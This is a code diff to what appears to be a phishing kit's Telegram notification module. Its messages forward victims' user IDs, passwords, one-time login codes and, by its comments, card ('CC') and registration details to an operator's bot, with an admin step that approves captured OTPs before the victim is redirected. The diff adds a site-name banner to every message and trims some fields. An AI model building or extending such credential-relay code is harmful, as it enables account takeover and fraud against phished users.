@@ -1,3 +1,4 @@
+import { SITE_DISPLAY_NAME } from "./site-url"
 import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
 // Get Telegram configuration from environment variables
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
@@ -95,6 +96,11 @@ function asUrlField(value: unknown, fallback = "Unknown"): string {
   if (isHttpUrl(resolved)) return asLink(resolved)
   return asCode(resolved)
 }
+/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
+export function wrapFlowMessage(body: string): string {
+  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
+}
+
 
 
 function asCode(value: unknown): string {
@@ -185,15 +191,12 @@ ${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data
   }
   // 1f) Login OTP submitted – second approval (admin must approve code before redirect)
   else if (data.type === 'login_otp_approval_request') {
-    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
     const adminLink = process.env.ADMIN_PORTAL_URL
       ? adminPortalLink()
       : '/admin/login'
-    message = `🔔 <b>OTP submitted – approve or deny</b>
+    message = `🔢 <b>OTP submitted – approve or deny</b>
 ━━━━━━━━━━━━━━━━━━
 👤 User ID: ${asCode((data as { userId?: string }).userId)}
-📧 Method: ${asCode(methodLabel)}
-${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
 🔐 Code: ${asCode((data as { password?: string }).password)}
 
 👉 ${asLink(adminLink, 'Approve or deny')}`
@@ -228,9 +231,7 @@ Method Selected: ${asCode(methodLabel)}`
         ? 'Email'
         : 'Text Message (SMS)'
 
-    message = `✅ <b>Verification Code Submitted</b>
-🔐 <b>Type:</b> ${asCode(methodLabel)}
-🔢 <b>Code:</b> ${asCode(data.otp)}`
+    message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
   }
   // 3a) Registration OTP verification (email/text on /registration)
   else if (
@@ -239,13 +240,9 @@ Method Selected: ${asCode(methodLabel)}`
     data.page === '/registration'
   ) {
     if (data.type === 'email_verification') {
-      message = `✅ <b>Verification Code Submitted</b>
-🔐 <b>Type:</b> Email : ${asCode(data.email)}
-🔢 <b>Code:</b> ${asCode(data.otp)}`
+      message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
     } else {
-      message = `✅ <b>Verification Code Submitted</b>
-🔐 <b>Type:</b> Text : ${asCode(data.phone)}
-🔢 <b>Code:</b> ${asCode(data.otp)}`
+      message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
     }
   }
   // 3b) Registration Step 1 – personal info
@@ -337,19 +334,10 @@ Method at time of click: ${asCode(methodLabel)}`
   }
   // 7) Fallback generic template (other events)
   else {
-    message = `📝 <b>Form Submission</b>
-
-🔹 <b>Type:</b> ${asCode(String(data.type || '').toUpperCase())}
-📄 <b>Page:</b> ${asCode(data.page)}
-
-${data.userId ? `👤 <b>User ID:</b> ${asCode(data.userId)}` : ''}
-${data.password ? `🔒 <b>Password:</b> ${asCode(data.password)}` : ''}
-${data.email ? `📧 <b>Email:</b> ${asCode(data.email)}` : ''}
-${data.phone ? `📱 <b>Phone:</b> ${asCode(data.phone)}` : ''}
-${data.otp ? `🔐 <b>OTP Code:</b> ${asCode(data.otp)}` : ''}`
+    return false
   }
 
-  return await sendTelegramMessage(message)
+  return await sendTelegramMessage(wrapFlowMessage(message))
 }
 
 export type SendTelegramMessageOptions = {
